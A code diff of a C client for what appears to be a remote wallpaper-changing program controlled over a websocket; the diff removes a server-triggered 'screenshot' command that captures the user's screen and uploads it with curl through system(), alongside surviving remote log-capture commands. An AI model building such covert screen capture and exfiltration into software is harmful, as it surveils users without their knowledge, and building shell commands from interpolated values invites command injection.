@@ -4,7 +4,6 @@
 #include "client/wallpaper.h"
 #include "client/updater.h"
 #include "client/keyboard.h"
-#include "client/screen.h"
 #include "mongoose.h"
 #include "cJSON.h"
 #include <stdio.h>
@@ -15,8 +14,6 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <errno.h>
-
-static void build_http_url(char *http_url, size_t size);
 
 #define WS_URL_REMOTE "wss://wallchange.codeky.fr"
 #define WS_URL_LOCAL "ws://localhost:8000"
@@ -436,37 +433,6 @@ static void handle_message(const char *msg, size_t len) {
         if (strcmp(command_item->valuestring, "stop_logs") == 0) {
             printf("Commande stop_logs reçue.\n");
             stop_log_capture();
-            cJSON_Delete(json);
-            return;
-        }
-        if (strcmp(command_item->valuestring, "screenshot") == 0) {
-            printf("Commande screenshot reçue.\n");
-            
-            char *username = get_username();
-            char filepath[512];
-            snprintf(filepath, sizeof(filepath), "/tmp/screenshot_%s.jpg", username);
-            
-            capture_screen(filepath);
-            
-            char http_url[512];
-            build_http_url(http_url, sizeof(http_url));
-            
-            char upload_cmd[2048];
-            // Added debugging: verbose curl and output redirect to /tmp/wc_upload.log
-            snprintf(upload_cmd, sizeof(upload_cmd), 
-                     "curl -v %s -F \"file=@%s\" \"%s/api/upload_screenshot?id=%s\" > /tmp/wc_upload.log 2>&1", 
-                     get_auth_header(), filepath, http_url, username);
-                     
-            printf("Executing: %s\n", upload_cmd);
-            int ret = system(upload_cmd);
-            if (ret != 0) {
-                printf("Erreur lors de l'envoi du screenshot (code: %d). Voir /tmp/wc_upload.log\n", ret);
-            } else {
-                printf("Screenshot envoyé avec succès (code: 0).\n");
-            }
-            unlink(filepath);
-            free(username);
-            
             cJSON_Delete(json);
             return;
         }
